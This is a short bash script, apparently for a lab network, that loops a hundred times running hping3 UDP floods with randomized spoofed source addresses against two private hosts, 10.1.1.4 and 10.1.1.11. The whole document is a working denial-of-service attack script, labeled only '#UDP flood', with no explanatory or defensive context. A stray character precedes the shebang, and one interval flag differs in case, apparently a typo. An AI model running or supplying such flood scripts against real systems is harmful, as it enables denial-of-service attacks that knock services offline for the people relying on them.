s#!/bin/bash
for i in {1..100}
do


   #UDP flood
   hping3 -2 --rand-source -i u5000  -d 64  -c 1000 10.1.1.4
   
   hping3 -2 --rand-source -i U5000  -d 64  -c 1000 10.1.1.11

done


